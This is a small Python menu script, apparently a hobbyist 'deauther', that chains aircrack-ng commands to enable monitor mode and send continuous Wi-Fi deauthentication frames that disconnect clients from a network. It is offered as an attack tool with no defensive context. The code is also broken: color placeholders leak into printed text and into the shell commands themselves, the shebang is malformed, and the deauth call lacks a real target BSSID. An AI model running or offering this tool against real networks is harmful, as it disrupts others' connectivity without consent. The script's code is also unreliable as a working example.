#!bin/python

import os, sys, time

# Color Text
green   =   "\033[1;92m"
white   =   "\033[1;97m"
ash     =   "\033[1;90m"
yellow  =   "\033[1;93m"
purple  =   "\033[1;95m"
red     =   "\033[1;91m"
blue    =   "\033[1;96m"

# Main Menu
def menu():
    time.sleep(3)
    os.system("clear")
    print("{red}******************************")
    print("{green}* [ Manual Code Deauther   ] *")
    print("{blue}* [ Author : Deauther Test ] *")
    print("{yellow}* [ Exit   : 0             ] *")
    print("{purple}******************************")
    time.sleep(2)
    tools = input("""{white}Command Test And Enter
Or Edit Code Manual >{green} nano deauther.py  : """)
# Output Menu
    if tools=="Test":
       os.system("clear")
       time.sleep(3)
       print("""{red}pls check manual or iwconfig in terminal...!!!
   Example: wlan0/wlan1, edit code manual nano deauther.py""")
       time.sleep(3)
       os.system("clear")
       print("{ash}Check Interface Wlan")
       os.system("{red}iwconfig wlan0")
       time.sleep(3)
       os.system("clear")
       os.system("{green}airmon-ng start wlan0")
       time.sleep(3)
       os.system("clear")
       os.system("{red}airmon-ng check kill")
       time.sleep(3)
       os.system("{read}airodump-ng -c 1 --bssid paste here bssid wlan0")
       print("CTRL + C TO DEAUTHER PROCCES...!!!")
       time.sleep(3)
       os.system("clear")
       time.sleep(3)
       print("{green}Deauther...{red}walk!!!")
       os.system("aireplay-ng -0 0 -a wlan0")

    elif tools=="nano deauther.py":
       os.system("clear")
       time.sleep(3)
       os.system("nano deauther.py")

    elif tools=="0":
       os.system("clear")
       time.sleep(3)
       print("{green}Thank You...{red}see you again:)")
       time.sleep(2)
       sys.exit()

    else:
       time.sleep(3)
       os.system("clear")
       os.system("{red}Input Code Not Valid...{green}Pls Input Code Valid.")
       time.sleep(3)
       os.system("python deauther.py")

menu()
